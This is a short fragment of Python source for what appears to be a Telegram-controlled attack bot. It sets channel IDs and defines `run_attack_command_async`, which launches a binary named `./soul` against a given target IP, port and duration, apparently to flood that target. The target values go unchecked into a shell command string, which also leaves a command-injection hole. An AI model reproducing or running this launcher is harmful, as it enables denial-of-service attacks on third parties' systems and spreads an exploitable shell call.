...
FORWARD_CHANNEL_ID = -1007740049047
CHANNEL_ID = -1007740049047
error_channel_id = -1007740049047
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 4")
